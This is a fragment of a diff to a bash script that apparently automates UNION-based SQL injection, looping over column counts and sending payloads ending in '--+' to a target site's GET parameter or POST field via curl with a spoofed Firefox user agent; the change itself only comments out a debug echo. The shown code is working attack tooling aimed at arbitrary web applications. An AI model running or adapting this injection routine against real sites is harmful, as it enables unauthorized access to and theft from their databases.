@@ -878,7 +878,7 @@ for i in $(seq 50)
               param2=$(echo "$param" | cut -d "'" -f2)
             fi
            ngecur=$(curl -s  --max-time 120 "$param1$union$colom--+$param2" -L -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0")
-           echo "$param1$union$colom--+$param2" #test
+           #echo "$param1$union$colom--+$param2" #test
          else
            if [[ "$postd" = "y" ]]; then
               ngecur=$(curl -sX POST  --max-time 120 "$site" -L -A "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --data "$postnya=null$union$colom--+")
